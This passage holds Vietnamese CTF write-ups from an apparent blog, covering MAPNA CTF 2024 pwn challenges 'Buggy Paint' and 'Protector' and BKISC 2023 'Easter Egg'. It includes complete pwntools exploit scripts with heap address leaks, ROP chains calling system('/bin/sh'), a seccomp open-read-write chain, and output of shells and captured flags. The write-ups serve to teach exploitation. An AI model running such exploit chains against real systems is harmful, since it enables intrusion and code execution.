-\u0026gt; content chunk 0 (n byte) chunk 1: struct chunk 1 (48 byte) -\u0026gt; content chunk 1 (n byte) chosen_box: tcache Sau đó mình set chosen_box là chunk 0:\nchunk 0: struct chunk 0 (48 byte) -\u0026gt; content chunk 0 (n byte) chunk 1: struct chunk 1 (48 byte) -\u0026gt; content chunk 1 (n byte) chosen_box: struct chunk 0 (48 byte) -\u0026gt; content chunk 0 (n byte) tcache Tiến hành free chunk 0 trước sau đó free chunk 1:\nchunk 0: chunk 1: chosen_box: struct chunk 0 (48 byte) -\u0026gt; content chunk 0 (n byte) tcache \u0026lt;- content chunk 0 (n byte, đã free) \u0026lt;- struct chunk 0 (48 byte, đã free) \u0026lt;- content chunk 1 (n byte, đã free) \u0026lt;- struct chunk 1 (48 byte, đã free) Sau đó chúng ta sẽ malloc 1 chunk 2 có content size là 48 byte (= size struct chunk). Và vì content size = struct size nên chúng ta cũng sẽ khởi tạo trước nội dung của content này theo struct Box như sau:\nstruct Box { int64_t x = 0; // tọa độ bất kỳ int64_t y = 0; // tọa độ bất kỳ char* color = heap base; // địa chỉ bất kỳ int64_t width = 8; // để leak 8 byte địa chỉ int64_t height = 1; // chỉ cần leak 1 địa chỉ char* content = leak_address; // địa chỉ cần leak trên heap chứa địa chỉ chuỗi format màu }; Mình sẽ gọi chuỗi 48 byte này là fake_data. Như vậy thì lúc này trên heap của chúng ta sẽ như sau:\nchunk 0: chunk 1: chunk 2: struct chunk 1 (48 byte) -\u0026gt; struct chunk 0 (48 byte, đang chứa fake_data biểu thị đúng như một struct chunk) chosen_box: struct chunk 0 (48 byte, đang chứa fake_data biểu thị đúng như một struct chunk) -\u0026gt; địa chỉ cần leak tcache \u0026lt;- content chunk 0 (n byte, đã free) \u0026lt;- content chunk 1 (n byte, đã free) Do tính chất của việc giải phóng và cấp phát bộ nhớ heap trên libc mà struct chunk của 2 chunk 0 và 1 đã được tận dụng lại và cấp cho chunk 2.\nDo chúng ta đã truyền fake_data vào content chunk của chunk 2 (aka struct chunk của chunk 0) mà giờ chỉ cần gọi hàm show_selected_box là có thể leak được 8 byte giá trị tại địa chỉ mong muốn.\nTừ đó chúng ta cứ thế mà free chunk 2 sau đó lại malloc 1 chunk mới với fake_data chứa địa chỉ cần leak tiếp theo. Cứ thực hiện leak theo quy trình địa chỉ heap -\u0026gt; địa chỉ chương trình -\u0026gt; địa chỉ libc -\u0026gt; địa chỉ stack.\nVà sau khi đã có được địa chỉ stack thì thay vì dùng nó để leak tiếp thì mình sẽ dùng tới hàm edit_selected_box để tạo rop chain trên stack thôi. Tới đây thì mọi mảnh ghép đã vào đúng ví trí rồi.\nfrom pwn import * context.binary = exe = ELF(\u0026#39;chall\u0026#39;, False) libc = ELF(\u0026#39;libc.so.6\u0026#39;, False) rop = ROP(libc) # io = process() # gdb.attach(io, api=True) io = remote(\u0026#39;3.75.185.198\u0026#39;, 2000) def create_box(x, y, w, h, color, data): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) io.sendlineafter(b\u0026#39;x: \u0026#39;, str(x).encode()) io.sendlineafter(b\u0026#39;y: \u0026#39;, str(y).encode()) io.sendlineafter(b\u0026#39;width: \u0026#39;, str(w).encode()) io.sendlineafter(b\u0026#39;height: \u0026#39;, str(h).encode()) io.sendlineafter(b\u0026#39;): \u0026#39;, str(color).encode()) io.sendafter(b\u0026#39;content: \u0026#39;, data) def delete_box(x, y): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;2\u0026#39;) io.sendlineafter(b\u0026#39;x: \u0026#39;, str(x).encode()) io.sendlineafter(b\u0026#39;y: \u0026#39;, str(y).encode()) def select_box(x, y): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;3\u0026#39;) io.sendlineafter(b\u0026#39;x: \u0026#39;, str(x).encode()) io.sendlineafter(b\u0026#39;y: \u0026#39;, str(y).encode()) def edit_box(data): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;4\u0026#39;) io.sendafter(b\u0026#39;content: \u0026#39;, data) def show_box(): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;5\u0026#39;) io.recvuntil(b\u0026#39;content:\\n\u0026#39;) # initialize create_box(0, 0, 8, 2, 1, b\u0026#39;chunk 0\u0026#39;) create_box(1, 1, 8, 2, 1, b\u0026#39;chunk 1\u0026#39;) # leak heap base select_box(0, 0) delete_box(0, 0) show_box() heap_base = u64(io.recvline(keepends=False)) \u0026lt;\u0026lt; 12 log.info(f\u0026#39;heap base: {hex(heap_base)}\u0026#39;) # leak elf base delete_box(1, 1) fake_data = p64(0) + p64(0) + p64(heap_base) + p64(8) + p64(1) + p64(heap_base + 0x310) create_box(0, 0, 8, 6, 1, fake_data) show_box() exe.address = u64(io.recvline(keepends=False)) - 0x207d log.info(f\u0026#39;exe base: {hex(exe.address)}\u0026#39;) # leak libc base delete_box(0, 0) fake_data = p64(0) + p64(0) + p64(heap_base) + p64(8) + p64(1) + p64(exe.got[\u0026#39;puts\u0026#39;]) create_box(0, 0, 8, 6, 1, fake_data) show_box() libc.address = u64(io.recvline(keepends=False)) - libc.sym[\u0026#39;puts\u0026#39;] log.info(f\u0026#39;libc base: {hex(libc.address)}\u0026#39;) # leak stack through eviron delete_box(0, 0) fake_data = p64(0) + p64(0) + p64(heap_base) + p64(8) + p64(1) + p64(libc.sym[\u0026#39;__environ\u0026#39;]) create_box(0, 0, 8, 6, 1, fake_data) show_box() stack = u64(io.recvline(keepends=False)) - 288 log.info(f\u0026#39;stack pointer at ret main: {hex(stack)}\u0026#39;) # ROP pop_rdi = libc.address + rop.find_gadget([\u0026#39;pop rdi\u0026#39;, \u0026#39;ret\u0026#39;])[0] delete_box(0, 0) fake_data = p64(0) + p64(0) + p64(heap_base) + p64(8) + p64(4) + p64(stack) create_box(0, 0, 8, 6, 1, fake_data) payload = p64(pop_rdi) + p64(next(libc.search(b\u0026#39;/bin/sh\\0\u0026#39;))) + p64(pop_rdi+1) + p64(libc.sym[\u0026#39;system\u0026#39;]) edit_box(payload) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;0\u0026#39;) io.interactive() $ python3 exp.py [*] Loaded 219 cached gadgets for \u0026#39;libc.so.6\u0026#39; [+] Opening connection to 3.75.185.198 on port 2000: Done [*] heap base: 0x55b1b7529000 [*] exe base: 0x55b1b5f65000 [*] libc base: 0x7f15bfb78000 [*] stack pointer at ret main: 0x7fff0224ce58 [*] Switching to interactive mode Invalid option $ ls chall flag.txt ld-linux-x86-64.so.2 libc.so.6 $ cat flag.txt MAPNA{1-c4n7-b3l13v3-7h47-4-bu6-c4n-l34d-70-7h15-f23f344b} Protector #\rMô tả: my flag is protected! what are you gonna do\nKiểm tra sơ bộ #\rĐề cho chúng ta 3 file: binary chall, Dockerfile và 1 file generate_directory_tree.py. Vì bài trước đã có đụng đến libc rồi nên khá sure là bài này khả năng cao cũng sẽ cần nên mình dựng lại 1 cái container như trong Dockerfile để lấy 2 file libc và loader ra sau đó link chúng lại với file chương trình.\n$ pwninit bin: ./chall libc: ./libc.so.6 ld: ./ld-linux-x86-64.so.2 unstripping libc https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.35-0ubuntu3.6_amd64.deb warning: failed unstripping libc: failed running eu-unstrip, please install elfutils: No such file or directory (os error 2) copying ./chall to ./chall_patched running patchelf on ./chall_patched writing solve.py stub $ mv chall_patched chall Sử dụng checksec lên file chall cho chúng ta kết quả như sau:\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3fd000) RUNPATH: b\u0026#39;.\u0026#39; Chương trình lần này vừa không bật PIE và canary cũng đồng thời cho chúng ta ghi đè lên GOT (Partial RELRO). Nhưng vì bài này ra sau và số solve còn thấp hơn Buggy Paint nên mình đoán là bài này cũng chẳng phải dạng vừa.\nTiếp theo thì mình sẽ kiểm tra file python generate_directory_tree.py.\nimport os import random import string flag = \u0026#34;MAPNA{placeholder_for_flag}\u0026#34; MIN_NAME_LENGTH = 8 MAX_NAME_LENGTH = 16 FILES_COUNT = 0x100 def get_random_name(): n = random.randint(MIN_NAME_LENGTH, MAX_NAME_LENGTH) return \u0026#34;\u0026#34;.join(random.choice(string.ascii_letters + string.digits) for i in range(n)) def generate_files(): files = [get_random_name() for i in range(FILES_COUNT)] real_flag_file = random.choice(files) for filepath in files: if filepath == real_flag_file: continue with open(filepath, \u0026#34;w\u0026#34;) as f: pass with open(real_flag_file, \u0026#34;w\u0026#34;) as f: f.write(flag) def main(): os.mkdir(\u0026#34;maze\u0026#34;) os.chdir(\u0026#34;maze\u0026#34;) generate_files() if __name__ == \u0026#34;__main__\u0026#34;: main() TLDR: khi chạy file này thì nó sẽ tạo một thư mục tên maze sau đó thì tạo 1 mớ file với tên ngẫu nhiên và đặt flag vào 1 trong số đó.\nTới đây là thấy khoai rồi vì mấy bài thường mà để flag không ở trong file tên flag hay flag.txt hay dính tới seccomp với getdents lắm.\nTới đây thì mình cũng quyết định kiểm tra luôn Dockerfile để xem toàn bộ chương trình sẽ được deploy lên remote như thế nào.\nFROM ubuntu@sha256:e6173d4dc55e76b87c4af8db8821b1feae4146dd47341e4d431118c7dd060a74 RUN apt-get -y update RUN apt-get -y upgrade RUN apt-get -y install socat python3 RUN useradd -m pwn WORKDIR /home/pwn COPY ./chall . COPY generate_directory_tree.py . RUN python3 generate_directory_tree.py RUN chown -R root:root /home/pwn RUN chmod -R 555 /home/pwn CMD [\u0026#34;socat\u0026#34;, \u0026#34;TCP-LISTEN:5000,reuseaddr,fork\u0026#34;, \u0026#34;EXEC:\u0026#39;timeout 60 su pwn -c ./chall\u0026#39;\u0026#34;] Vậy là khi deploy thì file generate_directory_tree.py sẽ được chạy trước để giấu flag đi sau đó file chương trình mới chạy.\nKiểm tra sơ nhiêu đây chắc là đủ rồi. Giờ thì check xem chương trình nó làm gì cái nào.\nPhân tích source code #\rHàm main của chương trình được decompile ra như sau:\nint __fastcall main(int argc, const char **argv, const char **envp) { char buf[32]; // [rsp+0h] [rbp-20h] BYREF disable_io_buffering(argc, argv, envp); printf(\u0026#34;Input: \u0026#34;); init_sandbox(); read(0, buf, 152uLL); return 0; } Hàm init_sandbox chủ yếu dùng để thêm rule cho seccomp chỉ cho phép một số lệnh gọi syscall cụ thể, đối với chương trình này thì là: open, close, read, write, mprotect, getdents và exit_group.\nĐúng như mình dự đoán, mục tiêu khai thác của chương trình này sẽ là leak được danh sách tên các file thông qua getdents và mở từng file ra đọc để kiếm flag.\nTuy nhiên thì trước đó thì mình phải leak được địa chỉ của libc vì bên trong chương trình chính không có đủ các hàm cần thiết để tiến hành đọc và in file. Chúng ta có thể leak địa chỉ libc bằng hàm printf cũng tương tự như thông thường khi làm với hàm puts (gọi printf lên GOT của printf).\nLên kịch bản khai thác #\rSau một hồi nghịch qua nghịch lại thì mình có để ý thấy một điều rất thú vị mà không biết có phải là unintended hay không nhưng nhờ nó mà mình đã có thể solve được bài này mà không cần gọi getdents để leak tên các file.\nNếu để ý sẽ thấy trước khi flag được mang giấu đi thì nó đã nằm sẵn trong file generate_directory_tree.py và khi đọc kỹ Dockerfile sẽ nhận ra file generate_directory_tree.py sau khi được thực thi thì vẫn còn tồn tại trong cùng thư mục với file chương trình mà không bị xóa đi.\nĐiều này đồng nghĩa với việc mình chỉ cần gọi open-read-write lên file generate_directory_tree.py là đã có thể đọc được flag mà chẳng cần phải tốn công mò đúng tên file chứa flag trong thư mục maze.\nCó 2 điều cần phải lưu ý khi viết script khai thác:\nĐầu tiên là sau khi leak được địa chỉ libc nếu như quay trở lại hàm main thì khi hàm main gọi lại hàm init_sandbox sẽ dính lỗi và chương trình sẽ dừng ngay lập tức. Vậy nên chúng ta cần phải nhảy xuống câu lệnh phía dưới đó là main+42\n0x000000000040150a \u0026lt;+42\u0026gt;: lea rax,[rbp-0x20] Tuy nhiên thì điều này cũng sẽ dẫn đến vấn đề chính là vì không quay trở về đầu hàm main nên chúng ta không thể khỏi tạo giá trị rbp mới cho lần gọi hàm này. Do đó mà từ đoạn này trở xuống thì stack của chương trình sẽ được tính từ giá trị rbp cũ mà ra.\nChính vì vậy mà khi thực hiện stack overflow để leak địa chỉ libc mình sẽ phải đồng thời set rbp trỏ tới vùng nhớ nào đó có quyền read bên trong chương trình (ví dụ như .bss).\nfrom pwn import * context.binary = exe = ELF(\u0026#39;chall\u0026#39;, False) libc = ELF(\u0026#39;libc.so.6\u0026#39;, False) pop_args = 0x4014d9 # pop rdi; pop rsi; pop rdx; ret; ret = 0x4014dc rop = ROP(libc) # io = process() # gdb.attach(io, api=True) io = remote(\u0026#39;3.75.185.198\u0026#39;, 10000) # leak libc through printf (same technique with puts) payload = b\u0026#39;\\0\u0026#39; * 0x20 payload += p64(exe.bss(0x100)) # new rbp payload += p64(pop_args) payload += p64(exe.got[\u0026#39;printf\u0026#39;]) payload += p64(0) payload += p64(0) payload += p64(ret) payload += p64(exe.plt[\u0026#39;printf\u0026#39;]) payload += p64(ret) payload += p64(exe.symbols[\u0026#39;main\u0026#39;]+42) io.sendlineafter(b\u0026#39;: \u0026#39;, payload) libc.address = u64(io.recv(6).ljust(8, b\u0026#39;\\0\u0026#39;)) - libc.symbols[\u0026#39;printf\u0026#39;] log.info(\u0026#39;libc.address: \u0026#39; + hex(libc.address)) Sau khi đã có địa chỉ libc rồi thì mình có thể tính được địa chỉ của các gadget pop_rax và syscall.\nTiếp theo là vấn đề thứ hai, vì ở hàm main chương trình chỉ đọc vào buffer 152 byte nên mình không thể ghi thẳng 1 chain open-read-write lên stack được.\nVấn đề này thì có 2 cách giải quyết: Hoặc là thực hiện lần lượt từng hành động open, read, write riêng biệt, mỗi lần thực hiện xong thì quay về main+42 để tiếp tục ghi đè lên stack bằng chain tiếp theo. Hoặc có thể tạo một chain trước đó để đọc vào trong stack số byte đủ lớn đủ chứa cả payload open-read-write (mình sử dụng cách này).\n# get new gadget from libc syscall = libc.address + rop.find_gadget([\u0026#39;syscall\u0026#39;, \u0026#39;ret\u0026#39;])[0] pop_rax = libc.address + rop.find_gadget([\u0026#39;pop rax\u0026#39;, \u0026#39;ret\u0026#39;])[0] # 1st chain to read more bytes into the new stack payload = b\u0026#39;./generate_directory_tree.py\u0026#39;.ljust(0x20, b\u0026#39;\\0\u0026#39;) + p64(exe.bss(0x100)) payload += p64(pop_args) payload += p64(0) payload += p64(exe.bss(0x100+64)) payload += p64(0x100) payload += p64(pop_rax) payload += p64(0) payload += p64(syscall) io.sendline(payload) Sau đó thì mình chỉ việc tạo payload là 1 chain open-read-write rồi ném hết vô trong stack là xong.\nfrom pwn import * context.binary = exe = ELF(\u0026#39;chall\u0026#39;, False) libc = ELF(\u0026#39;libc.so.6\u0026#39;, False) pop_args = 0x4014d9 # pop rdi; pop rsi; pop rdx; ret; ret = 0x4014dc rop = ROP(libc) # io = process() # gdb.attach(io, api=True) io = remote(\u0026#39;3.75.185.198\u0026#39;, 10000) # leak libc through printf (same technique with puts) payload = b\u0026#39;\\0\u0026#39; * 0x20 payload += p64(exe.bss(0x100)) # new rbp payload += p64(pop_args) payload += p64(exe.got[\u0026#39;printf\u0026#39;]) payload += p64(0) payload += p64(0) payload += p64(ret) payload += p64(exe.plt[\u0026#39;printf\u0026#39;]) payload += p64(ret) payload += p64(exe.symbols[\u0026#39;main\u0026#39;]+42) io.sendlineafter(b\u0026#39;: \u0026#39;, payload) libc.address = u64(io.recv(6).ljust(8, b\u0026#39;\\0\u0026#39;)) - libc.symbols[\u0026#39;printf\u0026#39;] log.info(\u0026#39;libc.address: \u0026#39; + hex(libc.address)) # get new gadget from libc syscall = libc.address + rop.find_gadget([\u0026#39;syscall\u0026#39;, \u0026#39;ret\u0026#39;])[0] pop_rax = libc.address + rop.find_gadget([\u0026#39;pop rax\u0026#39;, \u0026#39;ret\u0026#39;])[0] # 1st chain to read more bytes into the new stack payload = b\u0026#39;./generate_directory_tree.py\u0026#39;.ljust(0x20, b\u0026#39;\\0\u0026#39;) + p64(exe.bss(0x100)) payload += p64(pop_args) payload += p64(0) payload += p64(exe.bss(0x100+64)) payload += p64(0x100) payload += p64(pop_rax) payload += p64(0) payload += p64(syscall) io.sendline(payload) time.sleep(0.2) # 2nd chain: open-read-write # open payload = p64(pop_args) payload += p64(exe.bss(0x100)-0x20) payload += p64(0) payload += p64(0) payload += p64(pop_rax) payload += p64(2) payload += p64(syscall) # read payload += p64(pop_args) payload += p64(5) # fd on remote server (maybe will be 3 on your local) payload += p64(exe.bss(0x200)) payload += p64(100) payload += p64(pop_rax) payload += p64(0) payload += p64(syscall) # write payload += p64(pop_args) payload += p64(1) payload += p64(exe.bss(0x200)) payload += p64(100) payload += p64(pop_rax) payload += p64(1) payload += p64(syscall) payload += p64(exe.symbols[\u0026#39;main\u0026#39;]+42) io.sendline(payload) io.interactive() $ python3 exp.py [*] Loaded 219 cached gadgets for \u0026#39;libc.so.6\u0026#39; [+] Opening connection to 3.75.185.198 on port 10000: Done [*] libc.address: 0x7ff5b1e8e000 [*] Switching to interactive mode import os import random import string flag = \u0026#34;MAPNA{d3lu510n-0f-pr073c710n-28fba2}\u0026#34; MIN_NAME_LENGT ","date":"21 January 2024","externalUrl":null,"permalink":"/writeup/mapna-ctf-2024/","section":"","summary":"Writeup cho các thử thách mảng pwnable của giải MAPNA CTF 2024.","title":"MAPNA CTF 2024 - PWN writeup","type":"writeup"},{"content":"","date":"11 November 2023","externalUrl":null,"permalink":"/tags/2023/","section":"Tags","summary":"","title":"2023","type":"tags"},{"content":"","date":"11 November 2023","externalUrl":null,"permalink":"/tags/bkisc/","section":"Tags","summary":"","title":"BKISC","type":"tags"},{"content":"\rEaster Egg #\rMô tả: People don\u0026rsquo;t believe me when I say that you can still do a ret2libc with just one-byte overflow. Maybe you can prove them wrong by talking to my easter bunny.\nNote: Có ai tin được là tui tính để bài này ra hôm thi onsite không? =)))\nSetup #\rĐề bài cung cấp cho mình 3 file: chall, libc.so.6, ld-2.35.so. Từ điểm này công với việc đọc sơ qua mô tả của đề thì khả năng cao là phải thực hiện kỹ thuật ret2libc để chiếm shell chương trình và đọc flag.\nChính vì đề cung cấp cho mình các file libc và loader để debug ở local giống với môi trường trên remote thì việc đầu tiên cần phải làm đó chính là link các file này lại với file thử thách. Để tự động hóa việc này thì các bạn có thể sử dụng pwninit.\n$ pwninit bin: ./chall libc: ./libc.so.6 ld: ./ld-2.35.so copying ./chall to ./chall_patched running patchelf on ./chall_patched writing solve.py stub $ mv chall_patched chall $ ls chall flag.txt ld-2.35.so libc.so.6 solve.py $ ldd chall linux-vdso.so.1 (0x00007fff4c8fa000) libc.so.6 =\u0026gt; ./libc.so.6 (0x00007fa15f83e000) ./ld-2.35.so =\u0026gt; /lib64/ld-linux-x86-64.so.2 (0x00007fa15fa68000) Vậy là việc link file challenge và libc đã hoàn thành.\nPhân tích source code #\rCác bạn có thể sử dụng tùy ý các Decompiler khác nhau để tiến hành việc đọc code của chương trình. Mình thì sử dụng IDA Free vì nó miễn phí và hỗ trợ file ELF 64-bit. Nếu bạn giàu thì có thể dùng bản Pro luôn cho máu.\nThông qua IDA, mình nhận thấy rằng chương trình có 3 hàm chính là main, find_the_bunny và to_the_moon. Pseudocode của hàm main mà IDA decompile ra được như sau:\nint __cdecl main(int argc, const char **argv, const char **envp) { setbuf(stdin, 0LL); setbuf(_bss_start, 0LL); puts(\u0026#34;I heard the easter bunny wanna talk to you, but it\u0026#39;s no where to be seen.\u0026#34;); puts(\u0026#34;Can you find it?\u0026#34;); return find_the_bunny(); } Ở đây không có gì đặc biệt ngoài việc setup các buffer và sau đó gọi hàm find_the_bunny. Mình sẽ kiểm tra hàm này tiếp theo.\nssize_t find_the_bunny() { char buf[48]; // [rsp+0h] [rbp-30h] BYREF puts(\u0026#34;Due to limited stamina, you can only overwrite 1 byte.\u0026#34;); return read(0, buf, 57uLL); } Hàm tạo một buffer 48 byte ở vị trí rbp-0x30, tức là buffer này cách rbp là 48 byte. Vậy thì nó sẽ cách địa chỉ trả về của hàm find_the_bunny là 56 byte (tính bằng khoảng cách với rbp + 8). Hàm này cho mình viết lên stack 57 byte cũng chính là chỉ cho phép ghi đè lên byte đầu tiên của địa chỉ trả về.\nNgoài ra thì còn một hàm nữa là to_the_moon mà không được gọi tới ở bất kỳ chỗ nào trong chương trình. Mình đoán là mục tiêu trước mắt là phải gọi được hàm này. Vậy nên mình sẽ thử xem nó có gì trước đã.\nssize_t to_the_moon() { char buf[48]; // [rsp+0h] [rbp-30h] BYREF puts(\u0026#34;You have found the easter bunny!\u0026#34;); puts(\u0026#34;It gave you a lot of stamina potions.\u0026#34;); return read(0, buf, 100uLL); } Hàm này cũng tạo một buffer 48 byte ở vị trí rbp-0x30 nhưng lại đọc input đến tận 100 byte, cũng tức là mình có thể overflow stack đủ nhiều để sử dụng kỹ thuật ret2libc mà chiếm shell của chương trình.\nLên kịch bản khai thác #\rNhư đã phân tích ở trên, hàm to_the_moon sẽ là target chính nên mình phải bằng cách nào đó gọi được hàm này để khai thác lỗi buffer overflow để áp dụng kỹ thuật ret2libc chiếm shell chương trình.\nHàm find_the_bunny chỉ cho mình ghi đè lên được byte đầu tiên của địa chỉ trả về, nhưng vì các hàm này đểu thuộc chương trình gốc mà không phải hàm của libc nên trên lý thuyết thì chúng được đặt gần nhau và do đó có thể chỉ cần ghi đè 1 byte thôi cũng đủ để nhảy qua hàm khác được.\nVậy hướng khai thác của mình có thể tóm gọn lại như sau:\nOverflow 1 byte của hàm find_the_bunny để nhảy tới hàm to_the_moon. Lợi dụng lỗi buffer overflow của hàm to_the_moon để ret2libc và chiếm shell chương trình. Tiến hành debug #\rCó khá nhiều plugin cho gdb để việc debug trở nên dễ dàng hơn nhưng đối với người chơi pwn thì thường sử dụng nhất là pwndbg.\nNếu các bạn đã tới được bước này rồi thì đương nhiên sẽ gặp được chướng ngại lớn nhất của đề.\nKhi tiến hành debug địa chỉ trả về của find_the_bunny, mình nhận thấy rằng ở luồng thực thi thông thường chương trình sẽ nhảy về địa chỉ lệnh main+82 tức là tại\n0x0000000000401240 \u0026lt;main+82\u0026gt;: jmp 0x401264 \u0026lt;main+118\u0026gt; Tuy nhiên, địa chỉ bắt đầu của hàm to_the_moon lại nằm ở 0x401176, 2 địa chỉ này khác biệt nhau tận 2 byte và do đó, việc ghi đè 1 byte để nhảy từ địa chỉ trả về của hàm find_the_bunny đến hàm to_the_moon là bất khả thi.\nNếu các bạn tới được đây và cho rằng hết cách rồi, hoặc đi xin tác giả được ghi đè lên 2 byte thì không nhé. Vì chương trình này còn 1 thứ rất hay mà chỉ khi debug thì mới biết được.\nĐiểm bất thường của chương trình #\rKhi disassemble hàm main ra thì mình có được đoạn code assembly sau:\npwndbg\u0026gt; disass main Dump of assembler code for function main: 0x00000000004011ee \u0026lt;+0\u0026gt;: endbr64 0x00000000004011f2 \u0026lt;+4\u0026gt;: push rbp 0x00000000004011f3 \u0026lt;+5\u0026gt;: mov rbp,rsp 0x00000000004011f6 \u0026lt;+8\u0026gt;: mov rax,QWORD PTR [rip+0x2e53] # 0x404050 \u0026lt;stdin@@GLIBC_2.2.5\u0026gt; 0x00000000004011fd \u0026lt;+15\u0026gt;: mov esi,0x0 0x0000000000401202 \u0026lt;+20\u0026gt;: mov rdi,rax 0x0000000000401205 \u0026lt;+23\u0026gt;: call 0x401070 \u0026lt;setbuf@plt\u0026gt; 0x000000000040120a \u0026lt;+28\u0026gt;: mov rax,QWORD PTR [rip+0x2e2f] # 0x404040 \u0026lt;stdout@@GLIBC_2.2.5\u0026gt; 0x0000000000401211 \u0026lt;+35\u0026gt;: mov esi,0x0 0x0000000000401216 \u0026lt;+40\u0026gt;: mov rdi,rax 0x0000000000401219 \u0026lt;+43\u0026gt;: call 0x401070 \u0026lt;setbuf@plt\u0026gt; 0x000000000040121e \u0026lt;+48\u0026gt;: lea rdi,[rip+0xe6b] # 0x402090 0x0000000000401225 \u0026lt;+55\u0026gt;: call 0x401060 \u0026lt;puts@plt\u0026gt; 0x000000000040122a \u0026lt;+60\u0026gt;: lea rdi,[rip+0xea9] # 0x4020da 0x0000000000401231 \u0026lt;+67\u0026gt;: call 0x401060 \u0026lt;puts@plt\u0026gt; 0x0000000000401236 \u0026lt;+72\u0026gt;: mov eax,0x0 0x000000000040123b \u0026lt;+77\u0026gt;: call 0x4011b8 \u0026lt;find_the_bunny\u0026gt; 0x0000000000401240 \u0026lt;+82\u0026gt;: jmp 0x401264 \u0026lt;main+118\u0026gt; 0x0000000000401242 \u0026lt;+84\u0026gt;: lea rdi,[rip+0xea7] # 0x4020f0 0x0000000000401249 \u0026lt;+91\u0026gt;: call 0x401060 \u0026lt;puts@plt\u0026gt; 0x000000000040124e \u0026lt;+96\u0026gt;: xor rdi,rdi 0x0000000000401251 \u0026lt;+99\u0026gt;: mov rsi,rsp 0x0000000000401254 \u0026lt;+102\u0026gt;: add rsi,0x8 0x0000000000401258 \u0026lt;+106\u0026gt;: mov rdx,0x8 0x000000000040125f \u0026lt;+113\u0026gt;: call 0x401080 \u0026lt;read@plt\u0026gt; 0x0000000000401264 \u0026lt;+118\u0026gt;: nop 0x0000000000401265 \u0026lt;+119\u0026gt;: pop rbp 0x0000000000401266 \u0026lt;+120\u0026gt;: ret End of assembler dump. Thấy điều gì kỳ lạ không???\nTại main+77, chương trình tiến hành gọi hàm find_the_bunny và set địa chỉ trả về tại main+82. Tuy nhiên, khi đến địa chỉ lệnh tại main+82 chương trình lại nhảy thẳng xuống main+118 tức là khúc mà hàm main kết thúc, hoàn toàn bỏ qua hẳn một đoạn 7 dòng code assembly nằm giữa.\nCũng chính bởi câu lệnh jmp 0x401264 \u0026lt;main+118\u0026gt; đặc biệt này mà các decompiler đã bị đánh lừa và nghĩ rằng hàm main sau khi gọi find_the_bunny sẽ kết thúc. Xin chúc mừng bạn vừa tìm đc Easter Egg của chương trình, cũng chính là tên của đề.\nQuay trở lại vấn đề chính, mình có thể đọc thử và đoán xem đoạn này chương trình sẽ làm gì.\nĐầu tiên là khúc\n0x0000000000401242 \u0026lt;+84\u0026gt;: lea rdi,[rip+0xea7] # 0x4020f0 0x0000000000401249 \u0026lt;+91\u0026gt;: call 0x401060 \u0026lt;puts@plt\u0026gt; có lẽ chương trình sẽ in ra một string nào đó. Cái này thừa thải nên mình không cần để ý thêm.\nTiếp theo là đoạn còn lại này:\n0x000000000040124e \u0026lt;+96\u0026gt;: xor rdi,rdi 0x0000000000401251 \u0026lt;+99\u0026gt;: mov rsi,rsp 0x0000000000401254 \u0026lt;+102\u0026gt;: add rsi,0x8 0x0000000000401258 \u0026lt;+106\u0026gt;: mov rdx,0x8 0x000000000040125f \u0026lt;+113\u0026gt;: call 0x401080 \u0026lt;read@plt\u0026gt; Khi phân tích kỹ ra thì khúc này chương trình sẽ đọc 8 byte input của mình và lưu nó ở rsp+8. Mà rsp+8 của hàm main khi này sẽ là chính địa chỉ trả về của hàm main luôn.\nVậy tức là nếu mình tới được đoạn này thì sẽ có thể ghi đè lên địa chỉ trả về của main và từ đó nhảy tới được hàm to_the_moon. Và điều này hoàn toàn có thể thực hiện được do đoạn code assembly này nằm ngay dưới địa chỉ lệnh mà hàm find_the_bunny sẽ trở về sau khi kết thúc mà do đó chỉ khác biệt nhau đúng duy nhất 1 byte đầu tiên.\nLên kịch bản khai thác lần 2 #\rVậy hướng khai thác mới sẽ là như sau:\nOverflow 1 byte của hàm find_the_bunny để nhảy tới đoạn bị ẩn của hàm main tại main+84. Viết đè lên địa chỉ trả về của hàm main để nhảy tới hàm to_the_moon. Lợi dụng lỗi buffer overflow của hàm to_the_moon để ret2libc và chiếm shell chương trình. Viết script khai thác #\rMình để ý là ai mở ticket để hỏi về bài này cũng đều biết cách khai thác nhưng không thành công do chủ yếu scripting còn hơi lỏ đấy nhá\nfrom pwn import * context.binary = exe = ELF(\u0026#39;./chall\u0026#39;) libc = ELF(\u0026#39;./libc.so.6\u0026#39;) #io = process() #gdb.attach(io, api=True) io = remote(\u0026#39;34.87.54.101\u0026#39;, 4204) pop_rdi = 0x4012d3 # Stage 1: jump to the vulnerable function payload = b\u0026#39;i\u0026#39;*0x38 + b\u0026#39;\\x42\u0026#39; io.sendafter(b\u0026#39;byte.\\n\u0026#39;, payload) io.sendafter(b\u0026#39;more!\\n\u0026#39;, p64(exe.sym[\u0026#39;to_the_moon\u0026#39;])) # Stage 2: leak libc payload = b\u0026#39;i\u0026#39;*0x38 + p64(pop_rdi) + p64(exe.got[\u0026#39;puts\u0026#39;]) + p64(exe.plt[\u0026#39;puts\u0026#39;]) payload += p64(exe.sym[\u0026#39;to_the_moon\u0026#39;]) # Back to the vulnerable function to continue exploiting io.sendafter(b\u0026#39;potions.\\n\u0026#39;, payload) libc.address = u64(io.recvline(keepends=False).ljust(8, b\u0026#39;\\0\u0026#39;)) - libc.sym[\u0026#39;puts\u0026#39;] log.info(f\u0026#39;Libc base: {hex(libc.address)}\u0026#39;) # Stage 3: ret2system payload = b\u0026#39;i\u0026#39;*0x38 + p64(pop_rdi) + p64(libc.search(b\u0026#34;/bin/sh\u0026#34;).__next__()) + p64(libc.sym[\u0026#39;system\u0026#39;]) io.sendafter(b\u0026#39;potions.\\n\u0026#39;, payload) io.interactive() Chạy script và lấy flag thôi nào\n$ python exp.py [+] Opening connection to 34.87.54.101 on port 4204: Done [*] Libc base: 0x7f83a8c58000 [*] Switching to interactive mode $ ls flag.txt run $ cat flag.txt BKISC{0n3_c4n_35c4p3_7h3_3y3s_0f_th3_d3c0mp1l3r_bu7_n0t_7h3_d3bu99er} You 